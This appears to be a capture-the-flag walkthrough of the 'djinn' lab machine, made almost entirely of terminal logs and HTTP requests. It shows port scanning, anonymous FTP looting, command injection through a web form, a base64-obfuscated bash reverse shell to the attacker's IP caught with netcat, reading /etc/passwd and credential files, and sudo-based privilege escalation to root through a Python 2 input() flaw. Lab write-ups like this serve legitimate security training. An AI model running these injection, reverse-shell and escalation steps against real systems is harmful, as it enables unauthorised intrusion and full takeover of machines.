```
root@kali:~# nmap -sC -sV -T5 -p- 10.10.41.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 12:01 UTC
Nmap scan report for ip-10-10-41-110.eu-west-1.compute.internal (10.10.41.110)
Host is up (0.028s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.214.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b8:cb:14:15:05:a0:24:43:d5:8e:6d:bd:97:c0:63:e9 (RSA)
|   256 d5:70:dd:81:62:e4:fe:94:1b:65:bf:77:3a:e1:81:26 (ECDSA)
|_  256 6a:2a:ba:9c:ba:b2:2e:19:9f:5c:1c:87:74:0a:25:f0 (ED25519)
1337/tcp open  waste?
| fingerprint-strings:
|   NULL:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '/', 8)
|   RPCCheck:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '-', 2)
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=7/27%Time=5F1EC213%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\
SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20
SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\
SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths
SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20
SF:you\x20your\x20gift\.\n\(1,\x20'/',\x208\)\n>\x20")%r(RPCCheck,1BC,"\x2
SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x
SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x
SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x
SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x2
SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|
SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20
SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_
SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x2
SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2
SF:0my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20your
SF:\x20gift\.\n\(5,\x20'-',\x202\)\n>\x20");
MAC Address: 02:60:AB:A8:82:DE (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.68 seconds
root@
```


```
root@kali:~# ftp 10.10.41.110
Connected to 10.10.41.110.
220 (vsFTPd 3.0.3)
Name (10.10.41.110:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 21  2019 .
drwxr-xr-x    2 0        115          4096 Oct 21  2019 ..
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> mget *.txt
mget creds.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for creds.txt (11 bytes).
226 Transfer complete.
11 bytes received in 0.00 secs (3.6291 kB/s)
mget game.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for game.txt (128 bytes).
226 Transfer complete.
128 bytes received in 0.00 secs (165.5629 kB/s)
mget message.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for message.txt (113 bytes).
226 Transfer complete.
113 bytes received in 0.00 secs (239.3743 kB/s)
ftp> exit
221 Goodbye.
```

```
root@kali:~# cat creds.txt
nitu:81299
root@kali:~# cat game.txt
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
final level and get the prize.
root@kali:~# cat message.txt
@nitish81299 I am going on holidays for few days, please take care of all the work.
And don't mess up anything.
root@kali:~#
```

```
root@kali:~# gobuster dir -u http://10.10.41.110:7331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 -x txt,html,php,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.41.110:7331/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php,zip
[+] Timeout:        10s
===============================================================
2020/07/27 12:14:04 Starting gobuster
===============================================================
/wish (Status: 200)
```

```
POST /wish HTTP/1.1
Host: 10.10.41.110:7331
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://10.10.41.110:7331
Connection: close
Referer: http://10.10.41.110:7331/wish
Upgrade-Insecure-Requests: 1

cmd=id
```

```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 379
Location: http://10.10.41.110:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Mon, 27 Jul 2020 12:15:47 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A">/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</a>.  If not click the link.
```

```py

import socket
import re

def attack():
  ip = '10.10.41.110'
  port = 1337

  attack_socket = socket.socket()
  attack_socket.connect((ip, port))

  data = attack_socket.recv(1024).decode()
  print('data:\n'+data)
  count = 0
  for i in range(1001):
    data = attack_socket.recv(1024).decode()
    print('Data Start: '+ data)
    pattern = re.compile('\d+|[+/*-]')
    pull = pattern.findall(data)
    if count ==0:
      pull.remove('1000')
    print(pull)
    almost = ''.join(pull)
    print('almost: '+ almost)
    answer = eval(almost)
    print('answer: '+ str(answer))
    stringAnswer = str(answer)
    print('stringAnswer: '+ stringAnswer)
    test = attack_socket.send(stringAnswer.encode() + b'\n')
    print(test)
    data = attack_socket.recv(1024).decode()
    print(data)
    count = count+1
    print(count)



if __name__ == '__main__':
  attack()
```


```
root@kali:~# python 1337.py
data:
  ____                        _____ _
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Data Start:
Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(4, '-', 5)
>
[u'4', u'-', u'5']
almost: 4-5
answer: -1
stringAnswer: -1
3
(
1





Data Start: 5, '/', 1)
>
[u'5', u'/', u'1']
almost: 5/1
answer: 5
stringAnswer: 5
2
(
1000
Data Start: 7, '*', 4)
>
[u'7', u'*', u'4']
almost: 7*4
answer: 28
stringAnswer: 28
3
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409

1001
```

- can't find out
```
root@kali:~# knock 10.10.41.110 1356  6784 3409 && nmap -T5 -p- 10.10.41.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 13:24 UTC
Nmap scan report for ip-10-10-41-110.eu-west-1.compute.internal (10.10.41.110)
Host is up (0.0018s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
7331/tcp open  swx
MAC Address: 02:60:AB:A8:82:DE (Unknown)
```


```
root@kali:~# echo "bash -i >& /dev/tcp/10.10.214.80/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4yMTQuODAvMTIzNCAwPiYxCg==
```
```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4yMTQuODAvMTIzNCAwPiYxCg==" | base64 --decode | bash
```

```
POST /wish HTTP/1.1
Host: 10.10.41.110:7331
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: http://10.10.41.110:7331
Connection: close
Referer: http://10.10.41.110:7331/wish
Upgrade-Insecure-Requests: 1

cmd=echo+%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC40MS4xMTAvMTIzNCAwPiYxCg%3D%3D%22+%7C+base64+--decode+%7C+bash
```


```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
ls
connect to [10.10.214.80] from (UNKNOWN) [10.10.41.110] 54294
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ ls
app.py
app.pyc
static
templates
www-data@djinn:/opt/80$ whoami
whoami
www-data
www-data@djinn:/opt/80$
```

```
www-data@djinn:/opt/80$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
nitish:x:1001:1001::/home/nitish:/bin/bash
www-data@djinn:/opt/80$
```


```
www-data@djinn:/home/nitish$ ls -al
ls -al
total 32
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
-rw------- 1 root   root    130 Nov 12  2019 .bash_history
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
www-data@djinn:/home/nitish$ cd .dev
cd .dev
www-data@djinn:/home/nitish/.dev$ ls -al
ls -al
total 12
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 ..
-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt
www-data@djinn:/home/nitish/.dev$ cat creds.txt
cat creds.txt
nitish:<pass>
www-data@djinn:/home/nitish/.dev$
```

```
root@kali:~# ssh nitish@10.10.41.110
nitish@10.10.41.110's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 27 19:14:46 IST 2020

  System load:  0.01              Processes:           98
  Usage of /:   36.6% of 9.78GB   Users logged in:     0
  Memory usage: 40%               IP address for eth0: 10.10.41.110
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

10 packages can be updated.
10 updates are security updates.


Last login: Thu Nov 14 20:32:20 2019 from 192.168.1.107
nitish@djinn:~$ whoami
nitish
nitish@djinn:~$ ls -al
total 32
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
-rw------- 1 root   root    130 Nov 12  2019 .bash_history
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
nitish@djinn:~$ cat user.txt
<flag>
```

```
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
nitish@djinn:~$
```


```
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
nitish@djinn:~$ man genie
nitish@djinn:~$ sudo -u sam /usr/bin/genie -g -cmd /bin/sh
We've added your wish to our records.
Continue praying!!
nitish@djinn:~$ sudo -u sam /usr/bin/genie -g -cmd foobar
my man!!
$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```
```
$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100:
Enter your number: num
# whoami
root
# cd /root
# ls -a;
.  ..  .bash_history  .bashrc  .cache  .gnupg  lago  .local  .profile  proof.sh
# ls
lago  proof.sh
# ls -al
total 64
drwx------  5 root root  4096 Nov 18  2019 .
drwxr-xr-x 23 root root  4096 Nov 11  2019 ..
-rw-------  1 root root 23351 Nov 18  2019 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  3 root root  4096 Oct 21  2019 .cache
drwx------  3 root root  4096 Oct 21  2019 .gnupg
-rwxr-xr-x  1 root root  1827 Nov 14  2019 lago
drwxr-xr-x  3 root root  4096 Oct 20  2019 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   457 Nov 12  2019 proof.sh
# cat lago
#!/usr/bin/python2



from getpass import getuser

from os import system

from os.path import isfile

from random import randint





def naughtyboi():

    # TODO: Get some sexy news, if you know what I mean ;-)

    print("Working on it!! ")





def check(path):

    try:

        if isfile(path):

            return True

        else:

            return False

    except Exception:

        return False





def guessit():

    num = randint(1, 101)

    print("Choose a number between 1 to 100: ")

    try:

        s = input("Enter your number: ")

        if s == num:

            system("/bin/sh")

        else:

            print("Better Luck next time")

    except:

        print("Slow claps again")



def readfiles():

    user = getuser()

    try:

        path = raw_input("Enter the full of the file to read: ")

        if check(path):

            print("User %s is not allowed to read %s" % (user, path))

        else:

            print("Slow clap for this hacker right here")

    except Exception:

        print("Slow clap for this hacker right here")





def options():

    print("What do you want to do ?")

    print("1 - Be naughty")

    print("2 - Guess the number")

    print("3 - Read some damn files")

    print("4 - Work")



    try:

        choice = input("Enter your choice:")

    except Exception:

        print("\n")



    try:

        choice = int(choice)

        return choice

    except Exception:

        print("Man Stop hacking the damn input menu")





def main(op):

    if op == 1:

        naughtyboi()

    elif op == 2:

        guessit()

    elif op == 3:

        readfiles()

    elif op == 4:

        print("work your ass off!!")

    else:

        print("Do something better with your life")





if __name__ == "__main__":

    main(options())
# ls
lago  proof.sh
# ./proof.sh

    _                        _             _ _ _
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Mon Jul 27 19:43:35 IST 2020
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)

#
```
